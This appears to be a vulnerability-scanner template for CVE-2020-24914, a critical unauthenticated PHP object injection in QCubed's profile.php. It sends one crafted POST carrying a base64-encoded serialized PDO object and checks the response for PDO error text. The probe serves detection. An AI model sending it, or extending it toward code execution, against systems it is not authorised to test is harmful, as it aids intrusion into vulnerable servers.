id: CVE-2020-24914

info:
  name: QCubed - PHP Object Injection (CVE-2020-24914)
  author: riteshs4hu
  severity: critical
  description: |
    QCubed 3.1.1 and all versions contain a PHP object injection caused by unserializing untrusted POST data in profile.php, letting unauthenticated attackers execute arbitrary code via crafted POST requests.
  reference:
    - https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
    - seclists.org/fulldisclosure/2021/Mar/28
    - https://tech.feedyourhead.at/content/QCubed-PHP-Object-Injection-CVE-2020-24914
  classification:
    cwe-id: CWE-502
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  metadata:
    max-request: 1
    product: QCubed
  tags: cve,cve2020,qcubed,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/vendor/qcubed/qcubed/assets/php/profile.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "intDatabaseIndex=1&strReferrer=test&strProfileData=TzozOiJQRE8iOjA6e30%3d"

    matchers:
      - type: word
        part: body
        words:
          - "You cannot serialize or unserialize PDO instances"
          - "PDOException"
